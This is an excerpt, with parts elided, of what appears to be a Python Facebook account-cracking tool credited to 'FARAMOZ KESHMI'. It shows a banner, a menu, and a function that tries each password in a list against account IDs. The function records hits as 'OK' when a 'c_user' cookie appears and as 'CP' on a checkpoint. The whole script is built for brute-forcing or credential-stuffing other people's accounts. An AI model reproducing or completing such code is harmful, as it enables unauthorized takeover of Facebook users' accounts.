...
#------------logo------------#
logo=('''\033[1;92m       
    888888    db    88""Yb    db    8b    d8  dP"Yb  8888P 
    88__     dPYb   88__dP   dPYb   88b  d88 dP   Yb   dP  
    88""    dP__Yb  88"Yb   dP__Yb  88YbdP88 Yb   dP  dP   
    88     dP""""Yb 88  Yb dP""""Yb 88 YY 88  YbodP  d8888 ''')
#-----------clear------------#
def clear():
    sy('clear')
    print(logo)
    print(40*'-')
    print(F'[{G}+{R}]FACEBOOK : FARAMOZ KESHMI')
    print(F'[{G}+{B}]AUTHOR   : FARAMOZ KESHMI')
...
def Main():
    ...
    if user in ['01','1']:
        ...
        sy('xdg-open https://www.facebook.com/profile.php?id=100055742216218')
    elif user in ['00','0']:
...
def M1(ids,passlist):
    ...
    global cps
    global loop
    sys.stdout.write(F'\r\r{P}[FARAMOZ] %s|{G}OK:-%s'%(loop,len(oks))),sys.stdout.flush()
    try:
        for pas in passlist:
            ...
            if 'c_user' in req:
                print(F'\r\r {G}FARAMOZ-OK '+ids+' | '+pas+'{W}')
                oks.append(ids)
                break
            elif 'checkpoint' in req:
                print(F'\r\r {R}FARAMOZ-CP '+ids+' | '+pas+'{W}')
                cps.append(ids)
                break
            else:
                continue
